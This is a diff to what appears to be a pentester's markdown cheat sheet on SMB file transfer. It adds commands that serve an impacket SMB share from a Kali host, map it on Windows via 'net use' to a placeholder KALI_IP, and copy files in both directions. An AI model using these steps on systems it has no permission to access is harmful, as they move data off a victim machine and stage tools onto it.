@@ -1,5 +1,27 @@
 # SMB
 
+
+
+```
+# Kali side
+impacket-smbserver share . -smb2support -username USER -password PASS
+```
+
+```
+# Windows side
+net use Y: \\KALI_IP\share /user:USER PASS
+# After established connection
+# Transfer from windows to Kali
+copy FILE Y:\
+# Transfer from kali to windows
+copy Y:\File .\
+```
+
+
+
+
+
+
 Serve:
 ```
 python /usr/share/doc/python-impacket/examples/smbserver.py share-name root-dir
@@ -33,6 +55,10 @@ impacket-smbserver [SHARE NAME] /usr/share/windows-binaries/
 
 impacket-smbserver [SHARE NAME] [SHARE FOLDER] -smb2support
 ```
+
+
+
+
 
 
 #### Example 1
